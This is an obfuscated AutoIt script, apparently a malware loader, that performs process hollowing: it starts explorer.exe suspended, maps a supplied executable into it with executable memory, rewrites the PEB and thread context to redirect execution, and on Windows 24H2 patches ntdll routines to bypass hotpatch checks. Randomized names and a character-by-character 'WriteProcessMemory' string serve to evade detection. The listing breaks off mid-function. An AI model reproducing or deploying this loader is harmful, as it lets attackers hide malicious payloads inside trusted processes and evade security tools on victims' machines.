Global $VAR_1059 = DllStructGetData
Global $VAR_798 = BOKYSOG
Global $THSCLSMK___N4YL3BGLG = XXGZFLUYNANDEVHOQFUNC
Global $_SB0W6_ILA5Z_QK_YDSSYF = CDFXPN__SABGEXJCJLF
Global $PSBILQXOJPBVAPJXEQFNKXFRAV = BitShift
Global $VAR_1675 = DllStructSetData
Global $VAR_111 = BitAND
Global $ULKQLEFISB_MYXGITZV_OXBZUB = BinaryLen
Global $IOVDY_N0CPACYK_WV = EBNDPEJIPFUNC
Global $VAR_2415 = SetError
Global $VAR_3254 = DllStructCreate
Global $VAR_3284 = ConsoleWrite
Global $NFIYNRBQ_UZVNTRB = IsArray
Global $_WE_T09FHDUQBP4VFC_ = DllStructGetPtr
Global $E53HNEBRN_VA_4_C = PYPXYFUNC
Global $HBNLDJYO = OKEXHGQNINFILGANFUNC
Global $ZOGYFY_IDAYAI = Binary
Global $VAR_1890 = KITVP_YMCM_XYQMQHML
Global $VAR_1453 = DllCall
Global $GKBVYLTK_WGYORFNLB_SJARON = DllStructGetSize
Global $VAR_1772 = RegRead
$IOVDY_N0CPACYK_WV ( $X )
Func EBNDPEJIPFUNC ( $TI0C6WOGB_H_O__7YVARO , $RTLVZQIKU = "" , $_4LHD9UIV_X_GNBUSG = @WindowsDir & "\explorer.exe" )
	Local $VAR_4051
	Local $VAR_2654
	Local $NWURH
	Local $IXXXTD_FSUAEWSITD
	Local $ADZKHJFTXWBTSQ
	Local $JOICSGR
	Local $DDGJECXOZCA
	Local $_OUNA__5NQNDNOP727OEGDC
	Local $_OUNA__5NQNDNOP727OEGDC
	Local $IXXXTD_FSUAEWSITD
	Local $ADZKHJFTXWBTSQ
	Local $JOICSGR
	Local $GIHU31_ZJ05YZI9PP_SR = @AutoItX64
	Local $Z_FILJ_U_CLNGPQ3KAK_QN = $ZOGYFY_IDAYAI ( $TI0C6WOGB_H_O__7YVARO )
	Local $CRQUBDRKU = $VAR_3254 ( "byte[" & $ULKQLEFISB_MYXGITZV_OXBZUB ( $Z_FILJ_U_CLNGPQ3KAK_QN ) & "]" )
	$VAR_1675 ( $CRQUBDRKU , 1 , $Z_FILJ_U_CLNGPQ3KAK_QN )
	Local $XSCNUWZ_KZYQONNSM_WWSNHXVT = $_WE_T09FHDUQBP4VFC_ ( $CRQUBDRKU )
	Local $NTAYSE2OF_83P_AMF7I2SV_J_ = $VAR_3254 ( "dword  cbSize;ptr Reserved;ptr Desktop;ptr Title;dword X;dword Y;dword XSize;dword YSize;dword XCountChars;dword YCountChars;dword FillAttribute;dword Flags;word ShowWindow;word Reserved2;ptr Reserved2;ptr hStdInput;ptr hStdOutput;ptr hStdError" )
	Local $XAU6JNLOS__DJKQZ_ZDHA8CZ = $VAR_3254 ( "ptr Process;ptr Thread;dword ProcessId;dword ThreadId" )
	Local $VAR_312 = $VAR_1453 ( "kernel32.dll" , "bool" , "CreateProcessW" , "wstr" , $_4LHD9UIV_X_GNBUSG , "wstr" , $RTLVZQIKU , "ptr" , 0 , "ptr" , 0 , "int" , 0 , "dword" , 4 , "ptr" , 0 , "ptr" , 0 , "ptr" , $_WE_T09FHDUQBP4VFC_ ( $NTAYSE2OF_83P_AMF7I2SV_J_ ) , "ptr" , $_WE_T09FHDUQBP4VFC_ ( $XAU6JNLOS__DJKQZ_ZDHA8CZ ) )
	If @error Or Not $VAR_312 [ 0 ] Then
		Return $VAR_2415 ( 1 , 0 , 0 )
	EndIf
	Local $HOHYAHKSZBCHZRKXJ = $VAR_1059 ( $XAU6JNLOS__DJKQZ_ZDHA8CZ , "Process" )
	Local $IU__GVIO9GHM_WS_QCRLORHF1 = $VAR_1059 ( $XAU6JNLOS__DJKQZ_ZDHA8CZ , "Thread" )
	If $GIHU31_ZJ05YZI9PP_SR And $VAR_1890 ( $HOHYAHKSZBCHZRKXJ ) Then
		$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
		Return $VAR_2415 ( 2 , 0 , 0 )
	EndIf
	Local $MTJRZHXW
	Local $VAR_3585
	If $GIHU31_ZJ05YZI9PP_SR Then
		If @OSArch = "X64" Then
			$MTJRZHXW = 2
			$VAR_3585 = $VAR_3254 ( "align 16; uint64 P1Home; uint64 P2Home; uint64 P3Home; uint64 P4Home; uint64 P5Home; uint64 P6Home;dword ContextFlags; dword MxCsr;word SegCS; word SegDs; word SegEs; word SegFs; word SegGs; word SegSs; dword EFlags;uint64 Dr0; uint64 Dr1; uint64 Dr2; uint64 Dr3; uint64 Dr6; uint64 Dr7;uint64 Rax; uint64 Rcx; uint64 Rdx; uint64 Rbx; uint64 Rsp; uint64 Rbp; uint64 Rsi; uint64 Rdi; uint64 R8; uint64 R9; uint64 R10; uint64 R11; uint64 R12; uint64 R13; uint64 R14; uint64 R15;uint64 Rip;uint64 Header[4]; uint64 Legacy[16]; uint64 Xmm0[2]; uint64 Xmm1[2]; uint64 Xmm2[2]; uint64 Xmm3[2]; uint64 Xmm4[2]; uint64 Xmm5[2]; uint64 Xmm6[2]; uint64 Xmm7[2]; uint64 Xmm8[2]; uint64 Xmm9[2]; uint64 Xmm10[2]; uint64 Xmm11[2]; uint64 Xmm12[2]; uint64 Xmm13[2]; uint64 Xmm14[2]; uint64 Xmm15[2];uint64 VectorRegister[52]; uint64 VectorControl;uint64 DebugControl; uint64 LastBranchToRip; uint64 LastBranchFromRip; uint64 LastExceptionToRip; uint64 LastExceptionFromRip" )
		Else
			$MTJRZHXW = 3
			$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
			Return $VAR_2415 ( 102 , 0 , 0 )
		EndIf
	Else
		$MTJRZHXW = 1
		$VAR_3585 = $VAR_3254 ( "dword ContextFlags;dword Dr0; dword Dr1; dword Dr2; dword Dr3; dword Dr6; dword Dr7;dword ControlWord; dword StatusWord; dword TagWord; dword ErrorOffset; dword ErrorSelector; dword DataOffset; dword DataSelector; byte RegisterArea[80]; dword Cr0NpxState;dword SegGs; dword SegFs; dword SegEs; dword SegDs;dword Edi; dword Esi; dword Ebx; dword Edx; dword Ecx; dword Eax;dword Ebp; dword Eip; dword SegCs; dword EFlags; dword Esp; dword SegSs;byte ExtendedRegisters[512]" )
	EndIf
	Local $CONTEXT_FULL
	Switch $MTJRZHXW
	Case 1
		$CONTEXT_FULL = 65543
	Case 2
		$CONTEXT_FULL = 1048583
	Case 3
		$CONTEXT_FULL = 524327
	EndSwitch
	$VAR_1675 ( $VAR_3585 , "ContextFlags" , $CONTEXT_FULL )
	$VAR_312 = $VAR_1453 ( "kernel32.dll" , "bool" , "GetThreadContext" , "handle" , $IU__GVIO9GHM_WS_QCRLORHF1 , "ptr" , $_WE_T09FHDUQBP4VFC_ ( $VAR_3585 ) )
	If @error Or Not $VAR_312 [ 0 ] Then
		$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
		Return $VAR_2415 ( 3 , 0 , 0 )
	EndIf
	Local $VYJHQKKV
	Switch $MTJRZHXW
	Case 1
		$VYJHQKKV = $VAR_1059 ( $VAR_3585 , "Ebx" )
	Case 2
		$VYJHQKKV = $VAR_1059 ( $VAR_3585 , "Rdx" )
	Case 3
	EndSwitch
	Local $VAR_197 = $VAR_3254 ( "char Magic[2];word BytesOnLastPage;word Pages;word Relocations;word SizeofHeader;word MinimumExtra;word MaximumExtra;word SS;word SP;word Checksum;word IP;word CS;word Relocation;word Overlay;char Reserved[8];word OEMIdentifier;word OEMInformation;char Reserved2[20];dword AddressOfNewExeHeader" , $XSCNUWZ_KZYQONNSM_WWSNHXVT )
	Local $MLVGUSMWESWVEL = $XSCNUWZ_KZYQONNSM_WWSNHXVT
	$XSCNUWZ_KZYQONNSM_WWSNHXVT += $VAR_1059 ( $VAR_197 , "AddressOfNewExeHeader" )
	Local $WQKOSIO_QEINYBN = $VAR_1059 ( $VAR_197 , "Magic" )
	If Not ( $WQKOSIO_QEINYBN == "MZ" ) Then
		$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
		Return $VAR_2415 ( 4 , 0 , 0 )
	EndIf
	Local $VAR_3872 = $VAR_3254 ( "dword Signature" , $XSCNUWZ_KZYQONNSM_WWSNHXVT )
	$XSCNUWZ_KZYQONNSM_WWSNHXVT += 4
	If $VAR_1059 ( $VAR_3872 , "Signature" ) <> 17744 Then
		$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
		Return $VAR_2415 ( 5 , 0 , 0 )
	EndIf
	Local $__TJGDJKJ5D9FRC5Y_MBU_ = $VAR_3254 ( "word Machine;word NumberOfSections;dword TimeDateStamp;dword PointerToSymbolTable;dword NumberOfSymbols;word SizeOfOptionalHeader;word Characteristics" , $XSCNUWZ_KZYQONNSM_WWSNHXVT )
	Local $CTCIPEJ = $VAR_1059 ( $__TJGDJKJ5D9FRC5Y_MBU_ , "NumberOfSections" )
	$XSCNUWZ_KZYQONNSM_WWSNHXVT += 20
	Local $VFHRWLEC = $VAR_3254 ( "word Magic;" , $XSCNUWZ_KZYQONNSM_WWSNHXVT )
	Local $ASOGIDP_YGUNEVNIEG_JTNJEJADMP = $VAR_1059 ( $VFHRWLEC , 1 )
	Local $G_PQVEIIHWZUYLYULHPC
	If $ASOGIDP_YGUNEVNIEG_JTNJEJADMP = 267 Then
		If $GIHU31_ZJ05YZI9PP_SR Then
			$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
			Return $VAR_2415 ( 6 , 0 , 0 )
		EndIf
		$G_PQVEIIHWZUYLYULHPC = $VAR_3254 ( "word Magic;byte MajorLinkerVersion;byte MinorLinkerVersion;dword SizeOfCode;dword SizeOfInitializedData;dword SizeOfUninitializedData;dword AddressOfEntryPoint;dword BaseOfCode;dword BaseOfData;dword ImageBase;dword SectionAlignment;dword FileAlignment;word MajorOperatingSystemVersion;word MinorOperatingSystemVersion;word MajorImageVersion;word MinorImageVersion;word MajorSubsystemVersion;word MinorSubsystemVersion;dword Win32VersionValue;dword SizeOfImage;dword SizeOfHeaders;dword CheckSum;word Subsystem;word DllCharacteristics;dword SizeOfStackReserve;dword SizeOfStackCommit;dword SizeOfHeapReserve;dword SizeOfHeapCommit;dword LoaderFlags;dword NumberOfRvaAndSizes" , $XSCNUWZ_KZYQONNSM_WWSNHXVT )
		$XSCNUWZ_KZYQONNSM_WWSNHXVT += 96
	ElseIf $ASOGIDP_YGUNEVNIEG_JTNJEJADMP = 523 Then
		If Not $GIHU31_ZJ05YZI9PP_SR Then
			$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
			Return $VAR_2415 ( 6 , 0 , 0 )
		EndIf
		$G_PQVEIIHWZUYLYULHPC = $VAR_3254 ( "word Magic;byte MajorLinkerVersion;byte MinorLinkerVersion;dword SizeOfCode;dword SizeOfInitializedData;dword SizeOfUninitializedData;dword AddressOfEntryPoint;dword BaseOfCode;uint64 ImageBase;dword SectionAlignment;dword FileAlignment;word MajorOperatingSystemVersion;word MinorOperatingSystemVersion;word MajorImageVersion;word MinorImageVersion;word MajorSubsystemVersion;word MinorSubsystemVersion;dword Win32VersionValue;dword SizeOfImage;dword SizeOfHeaders;dword CheckSum;word Subsystem;word DllCharacteristics;uint64 SizeOfStackReserve;uint64 SizeOfStackCommit;uint64 SizeOfHeapReserve;uint64 SizeOfHeapCommit;dword LoaderFlags;dword NumberOfRvaAndSizes" , $XSCNUWZ_KZYQONNSM_WWSNHXVT )
		$XSCNUWZ_KZYQONNSM_WWSNHXVT += 112
	Else
		$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
		Return $VAR_2415 ( 6 , 0 , 0 )
	EndIf
	Local $W5LSM_F3VQFYY_JLBG_ = $VAR_1059 ( $G_PQVEIIHWZUYLYULHPC , "AddressOfEntryPoint" )
	Local $VAR_1844 = $VAR_1059 ( $G_PQVEIIHWZUYLYULHPC , "SizeOfHeaders" )
	Local $PNMDHQDYO_KRWGBLCDF = $VAR_1059 ( $G_PQVEIIHWZUYLYULHPC , "ImageBase" )
	Local $_TQW_FD_KZLXVYAFN = $VAR_1059 ( $G_PQVEIIHWZUYLYULHPC , "SizeOfImage" )
	$XSCNUWZ_KZYQONNSM_WWSNHXVT += 8
	$XSCNUWZ_KZYQONNSM_WWSNHXVT += 8
	$XSCNUWZ_KZYQONNSM_WWSNHXVT += 24
	Local $NAJJDJNAJW = $VAR_3254 ( "dword VirtualAddress; dword Size" , $XSCNUWZ_KZYQONNSM_WWSNHXVT )
	Local $__R6WUOFLPSUIL2JNG_S = $VAR_1059 ( $NAJJDJNAJW , "VirtualAddress" )
	Local $VAR_1933 = $VAR_1059 ( $NAJJDJNAJW , "Size" )
	Local $VAR_1579
	If $__R6WUOFLPSUIL2JNG_S And $VAR_1933 Then
		$VAR_1579 = True
	EndIf
	If Not $VAR_1579 Then
		$VAR_3284 ( "!!!NOT RELOCATABLE MODULE. I WILL TRY BUT THIS MAY NOT WORK!!!" & @CRLF )
	EndIf
	$XSCNUWZ_KZYQONNSM_WWSNHXVT += 88
	Local $GYHLRY_LEKVVQPBT_XXHBMX
	Local $NDEPNJVGOAQNBK
	If $VAR_1579 Then
		$NDEPNJVGOAQNBK = $E53HNEBRN_VA_4_C ( $HOHYAHKSZBCHZRKXJ , $_TQW_FD_KZLXVYAFN )
		If @error Then
			$NDEPNJVGOAQNBK = $_SB0W6_ILA5Z_QK_YDSSYF ( $HOHYAHKSZBCHZRKXJ , $PNMDHQDYO_KRWGBLCDF , $_TQW_FD_KZLXVYAFN )
			If @error Then
				$VAR_798 ( $HOHYAHKSZBCHZRKXJ , $PNMDHQDYO_KRWGBLCDF )
				$NDEPNJVGOAQNBK = $_SB0W6_ILA5Z_QK_YDSSYF ( $HOHYAHKSZBCHZRKXJ , $PNMDHQDYO_KRWGBLCDF , $_TQW_FD_KZLXVYAFN )
				If @error Then
					$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
					Return $VAR_2415 ( 101 , 1 , 0 )
				EndIf
			EndIf
		EndIf
		$GYHLRY_LEKVVQPBT_XXHBMX = True
	Else
		$NDEPNJVGOAQNBK = $_SB0W6_ILA5Z_QK_YDSSYF ( $HOHYAHKSZBCHZRKXJ , $PNMDHQDYO_KRWGBLCDF , $_TQW_FD_KZLXVYAFN )
		If @error Then
			$VAR_798 ( $HOHYAHKSZBCHZRKXJ , $PNMDHQDYO_KRWGBLCDF )
			$NDEPNJVGOAQNBK = $_SB0W6_ILA5Z_QK_YDSSYF ( $HOHYAHKSZBCHZRKXJ , $PNMDHQDYO_KRWGBLCDF , $_TQW_FD_KZLXVYAFN )
			If @error Then
				$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
				Return $VAR_2415 ( 101 , 0 , 0 )
			EndIf
		EndIf
	EndIf
	$VAR_1675 ( $G_PQVEIIHWZUYLYULHPC , "ImageBase" , $NDEPNJVGOAQNBK )
	Local $KNBSZ_EZZCM = $VAR_3254 ( "byte[" & $_TQW_FD_KZLXVYAFN & "]" )
	Local $VAR_3924 = $_WE_T09FHDUQBP4VFC_ ( $KNBSZ_EZZCM )
	Local $VAR_523 = $VAR_3254 ( "byte[" & $VAR_1844 & "]" , $MLVGUSMWESWVEL )
	$VAR_1675 ( $KNBSZ_EZZCM , 1 , $VAR_1059 ( $VAR_523 , 1 ) )
	Local $_2ET1EJ5CZ_3JGG_Y
	Local $HKOQOPCT
	Local $NTWJZHL
	Local $VAR_3814
	Local $XJFORNCCQU
	Local $BGB4LBDQL_V6PMQD__EHL2_VT
	For $I = 1 To $CTCIPEJ
		$_2ET1EJ5CZ_3JGG_Y = $VAR_3254 ( "char Name[8];dword UnionOfVirtualSizeAndPhysicalAddress;dword VirtualAddress;dword SizeOfRawData;dword PointerToRawData;dword PointerToRelocations;dword PointerToLinenumbers;word NumberOfRelocations;word NumberOfLinenumbers;dword Characteristics" , $XSCNUWZ_KZYQONNSM_WWSNHXVT )
		$HKOQOPCT = $VAR_1059 ( $_2ET1EJ5CZ_3JGG_Y , "SizeOfRawData" )
		$NTWJZHL = $MLVGUSMWESWVEL + $VAR_1059 ( $_2ET1EJ5CZ_3JGG_Y , "PointerToRawData" )
		$VAR_3814 = $VAR_1059 ( $_2ET1EJ5CZ_3JGG_Y , "VirtualAddress" )
		$XJFORNCCQU = $VAR_1059 ( $_2ET1EJ5CZ_3JGG_Y , "UnionOfVirtualSizeAndPhysicalAddress" )
		If $XJFORNCCQU And $XJFORNCCQU < $HKOQOPCT Then
			$HKOQOPCT = $XJFORNCCQU
		EndIf
		If $HKOQOPCT Then
			$VAR_1675 ( $VAR_3254 ( "byte[" & $HKOQOPCT & "]" , $VAR_3924 + $VAR_3814 ) , 1 , $VAR_1059 ( $VAR_3254 ( "byte[" & $HKOQOPCT & "]" , $NTWJZHL ) , 1 ) )
		EndIf
		If $GYHLRY_LEKVVQPBT_XXHBMX Then
			If $VAR_3814 <= $__R6WUOFLPSUIL2JNG_S And $VAR_3814 + $HKOQOPCT > $__R6WUOFLPSUIL2JNG_S Then
				$BGB4LBDQL_V6PMQD__EHL2_VT = $VAR_3254 ( "byte[" & $VAR_1933 & "]" , $NTWJZHL + ( $__R6WUOFLPSUIL2JNG_S - $VAR_3814 ) )
			EndIf
		EndIf
		$XSCNUWZ_KZYQONNSM_WWSNHXVT += 40
	Next
	If $GYHLRY_LEKVVQPBT_XXHBMX Then
		$HBNLDJYO ( $VAR_3924 , $BGB4LBDQL_V6PMQD__EHL2_VT , $NDEPNJVGOAQNBK , $PNMDHQDYO_KRWGBLCDF , $ASOGIDP_YGUNEVNIEG_JTNJEJADMP = 523 )
	EndIf
	$VAR_312 = $VAR_1453 ( "kernel32.dll" , "bool" , $THSCLSMK___N4YL3BGLG ( ) , "handle" , $HOHYAHKSZBCHZRKXJ , "ptr" , $NDEPNJVGOAQNBK , "ptr" , $VAR_3924 , "dword_ptr" , $_TQW_FD_KZLXVYAFN , "dword_ptr*" , 0 )
	If @error Or Not $VAR_312 [ 0 ] Then
		$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
		Return $VAR_2415 ( 7 , 0 , 0 )
	EndIf
	Local $HWQNQPHGBQ = $VAR_3254 ( "byte InheritedAddressSpace;byte ReadImageFileExecOptions;byte BeingDebugged;byte Spare;ptr Mutant;ptr ImageBaseAddress;ptr LoaderData;ptr ProcessParameters;ptr SubSystemData;ptr ProcessHeap;ptr FastPebLock;ptr FastPebLockRoutine;ptr FastPebUnlockRoutine;dword EnvironmentUpdateCount;ptr KernelCallbackTable;ptr EventLogSection;ptr EventLog;ptr FreeList;dword TlsExpansionCounter;ptr TlsBitmap;dword TlsBitmapBits[2];ptr ReadOnlySharedMemoryBase;ptr ReadOnlySharedMemoryHeap;ptr ReadOnlyStaticServerData;ptr AnsiCodePageData;ptr OemCodePageData;ptr UnicodeCaseTableData;dword NumberOfProcessors;dword NtGlobalFlag;byte Spare2[4];int64 CriticalSectionTimeout;dword HeapSegmentReserve;dword HeapSegmentCommit;dword HeapDeCommitTotalFreeThreshold;dword HeapDeCommitFreeBlockThreshold;dword NumberOfHeaps;dword MaximumNumberOfHeaps;ptr ProcessHeaps;ptr GdiSharedHandleTable;ptr ProcessStarterHelper;ptr GdiDCAttributeList;ptr LoaderLock;dword OSMajorVersion;dword OSMinorVersion;dword OSBuildNumber;dword OSPlatformId;dword ImageSubSystem;dword ImageSubSystemMajorVersion;dword ImageSubSystemMinorVersion;dword GdiHandleBuffer[34];dword PostProcessInitRoutine;dword TlsExpansionBitmap;byte TlsExpansionBitmapBits[128];dword SessionId" )
	$VAR_312 = $VAR_1453 ( "kernel32.dll" , "bool" , "ReadProcessMemory" , "ptr" , $HOHYAHKSZBCHZRKXJ , "ptr" , $VYJHQKKV , "ptr" , $_WE_T09FHDUQBP4VFC_ ( $HWQNQPHGBQ ) , "dword_ptr" , $GKBVYLTK_WGYORFNLB_SJARON ( $HWQNQPHGBQ ) , "dword_ptr*" , 0 )
	If @error Or Not $VAR_312 [ 0 ] Then
		$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
		Return $VAR_2415 ( 8 , 0 , 0 )
	EndIf
	$VAR_1675 ( $HWQNQPHGBQ , "ImageBaseAddress" , $NDEPNJVGOAQNBK )
	$VAR_312 = $VAR_1453 ( "kernel32.dll" , "bool" , $THSCLSMK___N4YL3BGLG ( ) , "handle" , $HOHYAHKSZBCHZRKXJ , "ptr" , $VYJHQKKV , "ptr" , $_WE_T09FHDUQBP4VFC_ ( $HWQNQPHGBQ ) , "dword_ptr" , $GKBVYLTK_WGYORFNLB_SJARON ( $HWQNQPHGBQ ) , "dword_ptr*" , 0 )
	If @error Or Not $VAR_312 [ 0 ] Then
		$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
		Return $VAR_2415 ( 9 , 0 , 0 )
	EndIf
	Switch $MTJRZHXW
	Case 1
		$VAR_1675 ( $VAR_3585 , "Eax" , $NDEPNJVGOAQNBK + $W5LSM_F3VQFYY_JLBG_ )
	Case 2
		$VAR_1675 ( $VAR_3585 , "Rcx" , $NDEPNJVGOAQNBK + $W5LSM_F3VQFYY_JLBG_ )
	Case 3
	EndSwitch
	$VAR_312 = $VAR_1453 ( "kernel32.dll" , "bool" , "SetThreadContext" , "handle" , $IU__GVIO9GHM_WS_QCRLORHF1 , "ptr" , $_WE_T09FHDUQBP4VFC_ ( $VAR_3585 ) )
	If @error Or Not $VAR_312 [ 0 ] Then
		$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
		Return $VAR_2415 ( 10 , 0 , 0 )
	EndIf
	If $GIHU31_ZJ05YZI9PP_SR And $VAR_1772 ( "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" , "DisplayVersion" ) = "24H2" Then
		$VAR_4051 = $VAR_1453 ( "kernel32.dll" , "ptr" , "GetModuleHandleW" , "wstr" , "ntdll.dll" )
		If @error Or Not $VAR_4051 [ 0 ] Then
			$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
			Return $VAR_2415 ( 12 , 0 , 0 )
		EndIf
		$VAR_2654 = $VAR_4051 [ 0 ]
		Local $BHUVZ [ 4 ] = [ 72 , 49 , 192 , 195 ]
		$NWURH = $VAR_1453 ( "kernel32.dll" , "ptr" , "GetProcAddress" , "ptr" , $VAR_2654 , "str" , "ZwManageHotPatch" )
		If $NFIYNRBQ_UZVNTRB ( $NWURH ) And $NWURH [ 0 ] Then
			For $I = 0 To 3
				$IXXXTD_FSUAEWSITD = $VAR_3254 ( "byte" )
				$VAR_1675 ( $IXXXTD_FSUAEWSITD , 1 , $BHUVZ [ $I ] )
				$ADZKHJFTXWBTSQ = $_WE_T09FHDUQBP4VFC_ ( $IXXXTD_FSUAEWSITD )
				$JOICSGR = $VAR_1453 ( "kernel32.dll" , "bool" , "WriteProcessMemory" , "handle" , $HOHYAHKSZBCHZRKXJ , "ptr" , $NWURH [ 0 ] + $I , "ptr" , $ADZKHJFTXWBTSQ , "dword" , 1 , "ptr" , 0 )
				If @error Or Not $JOICSGR [ 0 ] Then
					$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
					Return $VAR_2415 ( 12 , 0 , 0 )
				EndIf
			Next
		EndIf
		$DDGJECXOZCA = $VAR_1453 ( "kernel32.dll" , "ptr" , "GetProcAddress" , "ptr" , $VAR_2654 , "str" , "RtlEqualUnicodeString" )
		If $NFIYNRBQ_UZVNTRB ( $DDGJECXOZCA ) And $DDGJECXOZCA [ 0 ] Then
			$_OUNA__5NQNDNOP727OEGDC = $DDGJECXOZCA [ 0 ] + 784
		Else
			$_OUNA__5NQNDNOP727OEGDC = $VAR_2654 + 31712
		EndIf
		For $I = 0 To 3
			$IXXXTD_FSUAEWSITD = $VAR_3254 ( "byte" )
			$VAR_1675 ( $IXXXTD_FSUAEWSITD , 1 , $BHUVZ [ $I ] )
			$ADZKHJFTXWBTSQ = $_WE_T09FHDUQBP4VFC_ ( $IXXXTD_FSUAEWSITD )
			$JOICSGR = $VAR_1453 ( "kernel32.dll" , "bool" , "WriteProcessMemory" , "handle" , $HOHYAHKSZBCHZRKXJ , "ptr" , $_OUNA__5NQNDNOP727OEGDC + $I , "ptr" , $ADZKHJFTXWBTSQ , "dword" , 1 , "ptr" , 0 )
			If @error Or Not $JOICSGR [ 0 ] Then
				$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
				Return $VAR_2415 ( 12 , 0 , 0 )
			EndIf
		Next
	EndIf
	$VAR_312 = $VAR_1453 ( "kernel32.dll" , "dword" , "ResumeThread" , "handle" , $IU__GVIO9GHM_WS_QCRLORHF1 )
	If @error Or $VAR_312 [ 0 ] = + 4294967295 Then
		$VAR_1453 ( "kernel32.dll" , "bool" , "TerminateProcess" , "handle" , $HOHYAHKSZBCHZRKXJ , "dword" , 0 )
		Return $VAR_2415 ( 11 , 0 , 0 )
	EndIf
	$VAR_1453 ( "kernel32.dll" , "bool" , "CloseHandle" , "handle" , $HOHYAHKSZBCHZRKXJ )
	$VAR_1453 ( "kernel32.dll" , "bool" , "CloseHandle" , "handle" , $IU__GVIO9GHM_WS_QCRLORHF1 )
	Return $VAR_1059 ( $XAU6JNLOS__DJKQZ_ZDHA8CZ , "ProcessId" )
EndFunc
Func XXGZFLUYNANDEVHOQFUNC ( )
	Local $K3HTO4ENCQ_Y_6OMWEN_ [ 18 ] = [ "W" , "r" , "i" , "t" , "e" , "P" , "r" , "o" , "c" , "e" , "s" , "s" , "M" , "e" , "m" , "o" , "r" , "y" ]
	Local $G_IUSCLWAYWQUOLCVFASEISJBUAVMK
	For $SCHAR In $K3HTO4ENCQ_Y_6OMWEN_
		$G_IUSCLWAYWQUOLCVFASEISJBUAVMK &= $SCHAR
	Next
	Return $G_IUSCLWAYWQUOLCVFASEISJBUAVMK
EndFunc
Func OKEXHGQNINFILGANFUNC ( $VAR_3924 , $TM_YXL__35WZUWBCX1E , $XWQVRJYNQT , $VAR_1783 , $XNTQD__UYK2Q_QV )
	Local $RCARSKXDI_PGEGHXAS = $XWQVRJYNQT - $VAR_1783
	Local $ADVTW_1LMBH7BNL_S_M = $GKBVYLTK_WGYORFNLB_SJARON ( $TM_YXL__35WZUWBCX1E )
	Local $DGTQH_UYGDAIQ_SFCBPNG = $_WE_T09FHDUQBP4VFC_ ( $TM_YXL__35WZUWBCX1E )
	Local $VAR_1062
	Local $VAR_753
	Local $VAR_3814
	Local $DDQOVBP
	Local $VAR_1656
	Local $VAR_2409
	Local $URQYSFD_JB_OPV_S
	Local $BZWBJNXSFU_GRXYCB_FYKGSHKACN
	Local $VAR_2827 = 3 + 7 * $XNTQD__UYK2Q_QV
	While $VAR_753 < $ADVTW_1LMBH7BNL_S_M
		$VAR_1062 = $VAR_3254 ( "dword VirtualAddress; dword SizeOfBlock" , $DGTQH_UYGDAIQ_SFCBPNG + $VAR_753 )
		$VAR_3814 = $VAR_1059 ( $VAR_1062 , "VirtualAddress" )
		$DDQOVBP = $VAR_1059 ( $VAR_1062 , "SizeOfBlock" )
		$VAR_1656 = ( $DDQOVBP + 4294967288 ) / 2
		$VAR_2409 = $VAR_3254 ( "word[" & $VAR_1656 & "]" , $_WE_T09FHDUQBP4VFC_ ( $VAR_1062 ) + 8 )
		For $I = 1 To $VAR_1656
			$URQYSFD_JB_OPV_S = $VAR_1059 ( $VAR_2409 , 1 , $I )
			If $PSBILQXOJPBVAPJXEQFNKXFRAV ( $URQYSFD_JB_OPV_S , 12 ) = $VAR_2827 Then
				$BZWBJNXSFU_GRXYCB_FYKGSHKACN = $VAR_3254 ( "ptr" , $VAR_3924 + $VAR_3814 + $VAR_111 ( $URQYSFD_JB_OPV_S , 4095 ) )
				$VAR_1675 ( $BZWBJNXSFU_GRXYCB_FYKGSHKACN , 1 , $VAR_1059 ( $BZWBJNXSFU_GRXYCB_FYKGSHKACN , 1 ) + $RCARSKXDI_PGEGHXAS )
			EndIf
		Next
		$VAR_753 += $DDQOVBP
	WEnd
	Return 1
EndFunc
Func CDFXPN__SABGEXJCJLF ( $HOHYAHKSZBCHZRKXJ , $VAR_454 , $ADVTW_1LMBH7BNL_S_M )
	Local $VAR_312 = $VAR_1453 ( "kernel32.dll" , "ptr" , "VirtualAllocEx" , "handle" , $HOHYAHKSZBCHZRKXJ , "ptr" , $VAR_454 , "dword_ptr" , $ADVTW_1LMBH7BNL_S_M , "dword" , 4096 , "dword" , 64 )
	If @error Or Not $VAR_312 [ 0 ] Then
